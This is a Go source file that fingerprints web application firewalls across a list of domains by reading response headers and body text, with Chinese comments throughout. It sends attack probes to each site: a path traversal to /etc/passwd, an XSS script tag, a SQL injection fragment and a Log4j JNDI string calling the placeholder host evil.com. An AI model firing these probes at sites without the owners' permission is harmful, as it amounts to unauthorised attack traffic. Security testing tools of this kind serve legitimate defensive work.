package wafdetect

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// Result 表示单个域名的 WAF 检测结果
type Result struct {
	Domain   string
	WAF      string
	Database string
	Rows     int64
	Status   string
	Progress float64
}

// Config 表示 WAF 检测配置
type Config struct {
	Threads int
	Worker  int
	Timeout string
}

// 共享的 HTTP Transport，禁用 HTTP/2
var sharedTransport *http.Transport
var transportOnce sync.Once

// getTransport 获取共享的 HTTP Transport 实例
func getTransport() *http.Transport {
	transportOnce.Do(func() {
		sharedTransport = &http.Transport{
			DisableCompression: false,
			MaxIdleConns:       100,
			IdleConnTimeout:    90 * time.Second,
		}
		// 强制使用 HTTP/1.1，禁用 HTTP/2
		sharedTransport.TLSNextProto = make(map[string]func(authority string, c *tls.Conn) http.RoundTripper)
	})
	return sharedTransport
}

// RunWAFDetect 对给定的域名列表进行 WAF 检测（向后兼容，使用 context.Background()）
func RunWAFDetect(domains []string, config Config, progressCallback func([]Result, float64)) ([]Result, error) {
	return RunWAFDetectWithContext(context.Background(), domains, config, progressCallback)
}

// RunWAFDetectWithContext 对给定的域名列表进行 WAF 检测
// 使用指定的线程数、工作线程数和超时时间，支持通过 context 取消
func RunWAFDetectWithContext(ctx context.Context, domains []string, config Config, progressCallback func([]Result, float64)) ([]Result, error) {
	if len(domains) == 0 {
		return []Result{}, nil
	}

	// 解析超时时间（完全按照服务器设置的 timeout）
	if config.Timeout == "" {
		return nil, fmt.Errorf("timeout is required")
	}
	timeout, err := parseTimeout(config.Timeout)
	if err != nil {
		return nil, fmt.Errorf("invalid timeout format '%s': %v", config.Timeout, err)
	}

	results := make([]Result, 0, len(domains))
	resultsMutex := &sync.Mutex{}

	// 使用 worker pool 模式
	domainChan := make(chan string, len(domains))
	resultChan := make(chan Result, len(domains))

	// 发送所有域名到 channel
	for _, domain := range domains {
		select {
		case domainChan <- domain:
		case <-ctx.Done():
			return results, context.Canceled
		}
	}
	close(domainChan)

	// 启动 worker goroutines
	var wg sync.WaitGroup
	workerCount := config.Worker
	if workerCount <= 0 {
		workerCount = 1
	}

	// 完全按照服务器设置的 worker 数量运行，不限制
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for {
				select {
				case domain, ok := <-domainChan:
					if !ok {
						return
					}
					// 检查是否已取消
					select {
					case <-ctx.Done():
						return
					default:
					}
					result := detectWAFForDomainWithContext(ctx, domain, timeout)
					select {
					case resultChan <- result:
					case <-ctx.Done():
						return
					}
				case <-ctx.Done():
					return
				}
			}
		}(i)
	}

	// 等待所有 worker 完成
	go func() {
		wg.Wait()
		close(resultChan)
	}()

	// 收集结果
	completedCount := 0
	totalCount := len(domains)

	for {
		select {
		case result, ok := <-resultChan:
			if !ok {
				// Channel 已关闭，所有结果已收集
				return results, nil
			}
			resultsMutex.Lock()
			results = append(results, result)
			completedCount++
			currentResults := make([]Result, len(results))
			copy(currentResults, results)
			progress := float64(completedCount) / float64(totalCount) * 100.0
			resultsMutex.Unlock()

			// 调用进度回调
			if progressCallback != nil {
				progressCallback(currentResults, progress)
			}
		case <-ctx.Done():
			// 任务已取消，返回当前结果
			return results, context.Canceled
		}
	}
}

// normalizeDomain 规范化域名格式，自动添加协议前缀
func normalizeDomain(domain string) string {
	domain = strings.TrimSpace(domain)
	if domain == "" {
		return domain
	}

	// 如果已经有协议前缀，直接返回
	if strings.HasPrefix(domain, "http://") || strings.HasPrefix(domain, "https://") {
		return domain
	}

	// 移除可能的协议前缀（如果用户输入了但没有空格）
	domain = strings.TrimPrefix(domain, "http://")
	domain = strings.TrimPrefix(domain, "https://")

	// 移除尾部斜杠（如果有）
	domain = strings.TrimSuffix(domain, "/")

	// 自动添加 https:// 前缀
	return "https://" + domain
}

// detectWAFForDomain 检测单个域名的 WAF（向后兼容）
func detectWAFForDomain(domain string, timeout time.Duration) Result {
	return detectWAFForDomainWithContext(context.Background(), domain, timeout)
}

// detectWAFForDomainWithContext 检测单个域名的 WAF（支持 context 取消）
func detectWAFForDomainWithContext(ctx context.Context, domain string, timeout time.Duration) Result {
	result := Result{
		Domain:   domain,
		WAF:      "unknown",
		Database: "",
		Rows:     0,
		Status:   "running",
		Progress: 0,
	}

	// 规范化域名格式，自动添加协议前缀
	baseURL := normalizeDomain(domain)

	// 使用共享的 Transport（禁用 HTTP/2）
	transport := getTransport()

	// 创建带超时的 HTTP 客户端（完全按照服务器设置的 timeout）
	client := &http.Client{
		Timeout:   timeout,
		Transport: transport,
	}

	// 检查是否已取消
	select {
	case <-ctx.Done():
		result.Status = "paused"
		result.Progress = 0
		return result
	default:
	}

	// 第一步：检查网站是否在线（发送简单请求）
	isOnline, normalWAF := checkWebsiteOnlineWithContext(ctx, client, baseURL, timeout)
	if !isOnline {
		// 网站离线，不写入数据库
		result.Status = "offline"
		result.Progress = 100
		return result
	}

	// 检查是否已取消
	select {
	case <-ctx.Done():
		result.Status = "paused"
		result.Progress = 0
		return result
	default:
	}

	// 网站在线，继续检测 WAF
	if normalWAF != "unknown" {
		result.WAF = normalWAF
		result.Status = "completed"
		result.Progress = 100
		return result
	}

	// 检查是否已取消
	select {
	case <-ctx.Done():
		result.Status = "paused"
		result.Progress = 0
		return result
	default:
	}

	// 第二步：发送恶意 payload 触发 WAF 拦截
	wafFromPayload := detectFromPayloadRequestWithContext(ctx, client, baseURL, timeout)
	if wafFromPayload != "unknown" {
		result.WAF = wafFromPayload
		result.Status = "completed"
		result.Progress = 100
		return result
	}

	// 网站在线但没有检测到 WAF，标记为 "no waf"
	result.WAF = "no waf"
	result.Status = "completed"
	result.Progress = 100
	return result
}

// checkWebsiteOnline 检查网站是否在线，并尝试检测 WAF（向后兼容）
func checkWebsiteOnline(client *http.Client, url string, timeout time.Duration) (bool, string) {
	return checkWebsiteOnlineWithContext(context.Background(), client, url, timeout)
}

// checkWebsiteOnlineWithContext 检查网站是否在线，并尝试检测 WAF（支持 context 取消）
func checkWebsiteOnlineWithContext(ctx context.Context, client *http.Client, url string, timeout time.Duration) (bool, string) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false, "unknown"
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	// 合并传入的 context 和超时 context
	reqCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	req = req.WithContext(reqCtx)

	resp, err := client.Do(req)
	if err != nil {
		// 如果 HTTPS 失败，尝试 HTTP
		if strings.HasPrefix(url, "https://") {
			httpURL := strings.Replace(url, "https://", "http://", 1)
			req2, err2 := http.NewRequest("GET", httpURL, nil)
			if err2 == nil {
				req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
				reqCtx2, cancel2 := context.WithTimeout(ctx, timeout)
				req2 = req2.WithContext(reqCtx2)
				resp, err = client.Do(req2)
				cancel2()
				if err != nil {
					return false, "unknown"
				}
			} else {
				return false, "unknown"
			}
		} else {
			return false, "unknown"
		}
	}
	defer resp.Body.Close()

	// 读取响应体的一部分用于检测
	bodyBytes := make([]byte, 8192)
	n, _ := io.ReadAtLeast(resp.Body, bodyBytes, 0)
	bodyText := string(bodyBytes[:n])

	// 检测 WAF
	waf := detectWAFFromResponse(resp.Header, resp.StatusCode, bodyText)

	// 网站在线（有响应，无论状态码是什么）
	return true, waf
}

// detectFromNormalRequest 通过正常请求检测 WAF（检查响应头）
// 注意：此函数已被 checkWebsiteOnline 替代，保留用于向后兼容
func detectFromNormalRequest(client *http.Client, url string, timeout time.Duration) string {
	isOnline, waf := checkWebsiteOnline(client, url, timeout)
	if !isOnline {
		return "unknown"
	}
	return waf
}

// detectFromPayloadRequest 通过恶意 payload 触发 WAF 拦截来检测（向后兼容）
func detectFromPayloadRequest(client *http.Client, baseURL string, timeout time.Duration) string {
	return detectFromPayloadRequestWithContext(context.Background(), client, baseURL, timeout)
}

// detectFromPayloadRequestWithContext 通过恶意 payload 触发 WAF 拦截来检测（支持 context 取消）
func detectFromPayloadRequestWithContext(ctx context.Context, client *http.Client, baseURL string, timeout time.Duration) string {
	// 使用最有效的 payload 来触发 WAF（限制数量以提高速度）
	payloads := []string{
		"../../../../etc/passwd",    // 路径遍历
		"<script>alert(1)</script>", // XSS
		"UNION SELECT NULL--",       // SQL 注入
		"${jndi:ldap://evil.com/a}", // Log4j
	}

	// 只尝试前 3 个 payload，避免检测时间过长
	maxAttempts := 3
	if len(payloads) < maxAttempts {
		maxAttempts = len(payloads)
	}

	for i := 0; i < maxAttempts; i++ {
		// 检查是否已取消
		select {
		case <-ctx.Done():
			return "unknown"
		default:
		}

		payload := payloads[i]
		testURL := baseURL
		if strings.Contains(testURL, "?") {
			testURL += "&test=" + payload
		} else {
			testURL += "?test=" + payload
		}

		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

		// 使用较短的超时时间，避免检测时间过长
		payloadTimeout := timeout / 3
		if payloadTimeout < 5*time.Second {
			payloadTimeout = 5 * time.Second
		}
		reqCtx, cancel := context.WithTimeout(ctx, payloadTimeout)
		req = req.WithContext(reqCtx)

		resp, err := client.Do(req)
		cancel()

		if err != nil {
			continue
		}

		// 读取响应体
		bodyBytes := make([]byte, 16384) // 16KB
		n, _ := io.ReadAtLeast(resp.Body, bodyBytes, 0)
		bodyText := string(bodyBytes[:n])
		resp.Body.Close()

		// 检查是否被 WAF 拦截（403, 406, 429 等状态码）
		if resp.StatusCode == 403 || resp.StatusCode == 406 || resp.StatusCode == 429 {
			waf := detectWAFFromResponse(resp.Header, resp.StatusCode, bodyText)
			if waf != "unknown" {
				return waf
			}
			// 即使无法确定具体 WAF 类型，如果被拦截了，说明有 WAF
			return "Generic WAF"
		}

		// 检查响应体中是否有 WAF 拦截信息
		bodyLower := strings.ToLower(bodyText)
		wafKeywords := []string{
			"blocked",
			"forbidden",
			"access denied",
			"security violation",
			"firewall",
			"malicious",
			"unauthorized",
		}

		hasWAFKeyword := false
		for _, keyword := range wafKeywords {
			if strings.Contains(bodyLower, keyword) {
				hasWAFKeyword = true
				break
			}
		}

		if hasWAFKeyword {
			waf := detectWAFFromResponse(resp.Header, resp.StatusCode, bodyText)
			if waf != "unknown" {
				return waf
			}
			return "Generic WAF"
		}
	}

	return "unknown"
}

// detectWAFFromResponse 从 HTTP 响应头和响应体检测 WAF 类型
func detectWAFFromResponse(headers http.Header, statusCode int, bodyText string) string {
	bodyLower := strings.ToLower(bodyText)

	// 1. 检查响应头中的 WAF 标识
	wafHeaderSignatures := map[string]string{
		"cf-ray":                    "Cloudflare",
		"x-sucuri-id":               "Sucuri",
		"x-sucuri-cache":            "Sucuri",
		"x-waf-event":               "AWS WAF",
		"x-aws-waf":                 "AWS WAF",
		"x-protection":              "Barracuda",
		"x-barracuda":               "Barracuda",
		"x-fortinet":                "Fortinet",
		"x-imperva":                 "Imperva",
		"x-imperva-request-id":      "Imperva",
		"x-akamai-request-id":       "Akamai",
		"x-akamai-transformed":      "Akamai",
		"x-fastly":                  "Fastly",
		"x-fastly-request-id":       "Fastly",
		"x-cloudflare":              "Cloudflare",
		"x-cloudflare-ray":          "Cloudflare",
		"x-cloudflare-cache-status": "Cloudflare",
		"x-cloudflare-request-id":   "Cloudflare",
		"x-incapsula":               "Incapsula",
		"x-iinfo":                   "Incapsula",
		"x-waf":                     "Generic WAF",
		"x-wzws-requested-method":   "WangZhanBao",
		"x-datadome":                "DataDome",
		"x-shield":                  "ShieldSquare",
		"x-sucuri-blocked":          "Sucuri",
	}

	for headerName, wafName := range wafHeaderSignatures {
		if headers.Get(headerName) != "" {
			return wafName
		}
	}

	// 2. 检查 Server 头
	server := strings.ToLower(headers.Get("server"))
	if strings.Contains(server, "cloudflare") {
		return "Cloudflare"
	}
	if strings.Contains(server, "cloudfront") {
		return "AWS CloudFront"
	}
	if strings.Contains(server, "fastly") {
		return "Fastly"
	}
	if strings.Contains(server, "sucuri") {
		return "Sucuri"
	}
	if strings.Contains(server, "barracuda") {
		return "Barracuda"
	}
	if strings.Contains(server, "f5") {
		return "F5 BIG-IP"
	}

	// 3. 检查响应体中的 WAF 标识（按优先级排序）
	wafBodySignatures := map[string]string{
		// Cloudflare 特征（优先级高）
		"checking your browser":         "Cloudflare",
		"cloudflare ray id":             "Cloudflare",
		"cf-ray":                        "Cloudflare",
		"cloudflare":                    "Cloudflare",
		"attention required":            "Cloudflare",
		"just a moment":                 "Cloudflare",
		"ddos protection by cloudflare": "Cloudflare",

		// 其他常见 WAF
		"incapsula":      "Incapsula",
		"imperva":        "Imperva",
		"akamai":         "Akamai",
		"sucuri":         "Sucuri",
		"barracuda":      "Barracuda",
		"fortinet":       "Fortinet",
		"f5":             "F5 BIG-IP",
		"aws waf":        "AWS WAF",
		"aws cloudfront": "AWS CloudFront",
		"modsecurity":    "ModSecurity",
		"comodo":         "Comodo WAF",
		"wordfence":      "Wordfence",
		"ninjafirewall":  "NinjaFirewall",
		"bulletproof":    "BulletProof Security",

		// 通用 WAF 拦截信息
		"your request has been blocked": "Generic WAF",
		"request blocked":               "Generic WAF",
		"access denied":                 "Generic WAF",
		"blocked by":                    "Generic WAF",
		"security by":                   "Generic WAF",
		"protected by":                  "Generic WAF",
		"waf":                           "Generic WAF",
		"web application firewall":      "Generic WAF",
		"403 forbidden":                 "Generic WAF",
		"406 not acceptable":            "Generic WAF",
		"security violation":            "Generic WAF",
		"forbidden request":             "Generic WAF",
		"malicious request":             "Generic WAF",
	}

	for signature, wafName := range wafBodySignatures {
		if strings.Contains(bodyLower, signature) {
			return wafName
		}
	}

	// 4. 检查状态码（某些 WAF 会返回特定的状态码）
	if statusCode == 403 {
		// 403 可能是 WAF 拦截，但不确定具体类型
		if strings.Contains(bodyLower, "cloudflare") {
			return "Cloudflare"
		}
		if strings.Contains(bodyLower, "incapsula") {
			return "Incapsula"
		}
		// 其他情况可能是 WAF，但无法确定类型
	}

	if statusCode == 406 {
		// 406 通常是 WAF 拦截
		return "Generic WAF"
	}

	// 5. 检查 X-Powered-By 头
	poweredBy := strings.ToLower(headers.Get("x-powered-by"))
	if strings.Contains(poweredBy, "cloudflare") {
		return "Cloudflare"
	}

	return "unknown"
}

// detectDatabaseFromResponse 从响应中检测数据库类型（简化版本）
func detectDatabaseFromResponse(resp *http.Response) string {
	// 这是一个简化版本，实际检测可能需要分析响应体
	// 这里返回空字符串，表示未检测到数据库类型
	return ""
}

// parseTimeout 解析超时字符串（如 "30s", "1m" 等）
func parseTimeout(timeoutStr string) (time.Duration, error) {
	if timeoutStr == "" {
		return 30 * time.Second, nil
	}

	timeoutStr = strings.TrimSpace(timeoutStr)
	duration, err := time.ParseDuration(timeoutStr)
	if err != nil {
		return 0, fmt.Errorf("invalid timeout format: %s", timeoutStr)
	}

	return duration, nil
}
